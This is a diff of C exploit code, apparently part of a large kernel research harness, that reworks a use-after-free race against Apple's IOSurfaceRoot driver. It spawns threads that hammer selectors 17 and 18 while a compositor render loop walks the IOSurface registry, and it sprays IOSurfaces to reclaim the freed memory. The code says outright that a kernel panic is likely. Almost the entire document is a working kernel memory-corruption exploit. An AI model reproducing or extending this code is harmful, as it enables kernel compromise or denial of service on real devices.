@@ -19603,9 +19603,9 @@ new_modes:
             goto done;
         }
         if (rounds == 251) {
-            rlog("*** rounds=251: Exact r=206 pattern + spray + render ***\n");
-            rlog("  Sequential sel17+sel18 on SAME connection (proven to work),\n");
-            rlog("  then close connection, spray IOSurfaces, render\n\n");
+            rlog("*** rounds=251: Concurrent render + sel17/18 race ***\n");
+            rlog("  Race is between COMPOSITOR read and sel18 free on same connection.\n");
+            rlog("  Start render FIRST, then rapid register+deregister while compositor walks registry.\n\n");
 
             char r251_sp[256];
             { char *h = getenv("HOME"); snprintf(r251_sp, sizeof(r251_sp), "%s/Documents/uaf251_state.bin", h?h:"/tmp"); }
@@ -19619,15 +19619,11 @@ new_modes:
                 IOServiceMatching("IOSurfaceRoot"));
             if (!r251_svc) { rlog("  NO IOSurfaceRoot!\n"); goto r251_done; }
 
-            int r251_races = 20;
-            int r251_iters = 50;
-            int r251_spray = 500;
-            if (argc > 3) r251_races = atoi(argv[3]);
-            if (argc > 4) r251_iters = atoi(argv[4]);
-            if (argc > 5) r251_spray = atoi(argv[5]);
-            rlog("  Races: %d  Iters/race: %d  Spray: %d\n",
-                 r251_races, r251_iters, r251_spray);
+            io_connect_t r251_rc = IO_OBJECT_NULL;
+            IOServiceOpen(r251_svc, mach_task_self(), 0, &r251_rc);
+            if (!r251_rc) { rlog("  open failed\n"); goto r251_done; }
 
+            /* Pre-spray IOSurfaces so compositor has objects to walk */
             CFMutableDictionaryRef r251_props = CFDictionaryCreateMutable(NULL, 0,
                 &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
             int r251_w = 32, r251_h = 32, r251_bpe = 4, r251_pf = 0x42475241;
@@ -19640,75 +19636,62 @@ new_modes:
             CFDictionarySetValue(r251_props, CFSTR("IOSurfaceBytesPerElement"), r251_bn);
             CFDictionarySetValue(r251_props, CFSTR("IOSurfacePixelFormat"), r251_pfn);
 
-            for (int race = 0; race < r251_races; race++) {
-                rlog("\n  --- Race %d/%d ---\n", race + 1, r251_races);
+            IOSurfaceRef r251_surfs[200];
+            int r251_spray_ok = 0;
+            for (int i = 0; i < 200; i++) {
+                r251_surfs[i] = IOSurfaceCreate(r251_props);
+                if (r251_surfs[i]) r251_spray_ok++;
+            }
+            rlog("  Pre-sprayed %d IOSurfaces\n", r251_spray_ok);
 
-                io_connect_t r251_rc = IO_OBJECT_NULL;
-                IOServiceOpen(r251_svc, mach_task_self(), 0, &r251_rc);
-                if (!r251_rc) { rlog("  open failed\n"); continue; }
+            /* Start render FIRST — compositor begins walking IOSurface registry */
+            rlog("  Starting render loop...\n");
+            p13_render_run = 1;
+            p13_render_frames = 0;
+            pthread_t r251_rt;
+            pthread_create(&r251_rt, NULL, p13_render_loop, NULL);
+            usleep(100000); /* let render start */
 
-                uint64_t r251_inp[3] = {1, 2, 3};
-                int r251_reg_ok = 0, r251_reg_fail = 0;
-                int r251_dereg_ok = 0, r251_dereg_fail = 0;
-                mach_port_t r251_wps[200];
-                int r251_wp_n = 0;
+            /* Now race: rapid sel17+sel18 DURING render.
+             * Race window: compositor reads registry entry → sel18 frees it → compositor dereferences freed ptr
+             * Use multi-threaded: 2 sel17 threads + 2 sel18 threads on SHARED connection */
+            rlog("  Starting sel17/18 race threads on shared connection (5s)...\n");
+            rlog("  >>> WARNING: HIGH PROBABILITY OF KERNEL PANIC <<<\n");
+            fflush(stdout);
 
-                for (int i = 0; i < r251_iters; i++) {
-                    mach_port_t wp = MACH_PORT_NULL;
-                    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &wp);
-                    mach_port_insert_right(mach_task_self(), wp, wp, MACH_MSG_TYPE_MAKE_SEND);
-                    uint64_t ref = 0xD251 + i;
+            g_race250_conn = r251_rc;
+            g_race250_run = 1;
+            g_race250_reg_ok = 0; g_race250_reg_fail = 0;
+            g_race250_dereg_ok = 0; g_race250_dereg_fail = 0;
 
-                    kern_return_t rr = IOConnectCallAsyncMethod(r251_rc, 17, wp, &ref, 1,
-                        NULL, 0, r251_inp, 24, NULL, NULL, NULL, NULL);
-                    kern_return_t rd = IOConnectCallMethod(r251_rc, 18, NULL, 0,
-                        r251_inp, 24, NULL, NULL, NULL, NULL);
+            pthread_t r251_t[4];
+            pthread_create(&r251_t[0], NULL, g_race250_sel17_fn, NULL);
+            pthread_create(&r251_t[1], NULL, g_race250_sel17_fn, NULL);
+            pthread_create(&r251_t[2], NULL, g_race250_sel18_fn, NULL);
+            pthread_create(&r251_t[3], NULL, g_race250_sel18_fn, NULL);
 
-                    if (rr == 0) r251_reg_ok++; else r251_reg_fail++;
-                    if (rd == 0) r251_dereg_ok++; else r251_dereg_fail++;
-
-                    if (r251_wp_n < 200) r251_wps[r251_wp_n++] = wp;
-                    else mach_port_deallocate(mach_task_self(), wp);
-                }
-                rlog("  Race: reg=%d/%d dereg=%d/%d\n",
-                     r251_reg_ok, r251_reg_fail, r251_dereg_ok, r251_dereg_fail);
-
-                /* Close connection — this frees any remaining registry entries */
-                IOServiceClose(r251_rc);
-
-                /* IMMEDIATELY spray IOSurfaces to reclaim freed memory */
-                IOSurfaceRef *r251_surfs = calloc(r251_spray, sizeof(IOSurfaceRef));
-                int r251_spray_ok = 0;
-                for (int i = 0; i < r251_spray; i++) {
-                    r251_surfs[i] = IOSurfaceCreate(r251_props);
-                    if (r251_surfs[i]) r251_spray_ok++;
-                }
-                rlog("  Sprayed %d/%d, rendering (3s)...\n", r251_spray_ok, r251_spray);
-
-                /* Render — compositor will walk IOSurface objects, hitting any reclaimed entries */
-                rlog("  >>> WARNING: KERNEL PANIC LIKELY <<<\n");
-                fflush(stdout);
-                p13_render_run = 1;
-                p13_render_frames = 0;
-                pthread_t r251_rt;
-                pthread_create(&r251_rt, NULL, p13_render_loop, NULL);
-                for (int s = 0; s < 3; s++) {
-                    usleep(1000000);
-                    rlog("  +%ds frames=%d\n", s+1, p13_render_frames);
-                }
-                p13_render_run = 0;
-                pthread_join(r251_rt, NULL);
-                rlog("  Survived race %d! frames=%d\n", race+1, p13_render_frames);
-
-                /* Cleanup spray and ports for next race */
-                for (int i = 0; i < r251_spray; i++)
-                    if (r251_surfs[i]) CFRelease(r251_surfs[i]);
-                free(r251_surfs);
-                for (int i = 0; i < r251_wp_n; i++)
-                    mach_port_deallocate(mach_task_self(), r251_wps[i]);
+            for (int s = 0; s < 5; s++) {
+                usleep(1000000);
+                rlog("  +%ds reg=%d/%d dereg=%d/%d frames=%d\n", s+1,
+                     g_race250_reg_ok, g_race250_reg_fail,
+                     g_race250_dereg_ok, g_race250_dereg_fail,
+                     p13_render_frames);
             }
 
-            rlog("\n  === SURVIVED all %d races! ===\n", r251_races);
+            g_race250_run = 0;
+            for (int i = 0; i < 4; i++) pthread_join(r251_t[i], NULL);
+            p13_render_run = 0;
+            pthread_join(r251_rt, NULL);
+
+            rlog("\n  === SURVIVED concurrent render + race! ===\n");
+            rlog("  Total: reg=%d/%d dereg=%d/%d frames=%d\n",
+                 g_race250_reg_ok, g_race250_reg_fail,
+                 g_race250_dereg_ok, g_race250_dereg_fail,
+                 p13_render_frames);
+
+            IOServiceClose(r251_rc);
+            for (int i = 0; i < 200; i++)
+                if (r251_surfs[i]) CFRelease(r251_surfs[i]);
             CFRelease(r251_props); CFRelease(r251_wn); CFRelease(r251_hn);
             CFRelease(r251_bn); CFRelease(r251_pfn);
             IOObjectRelease(r251_svc);
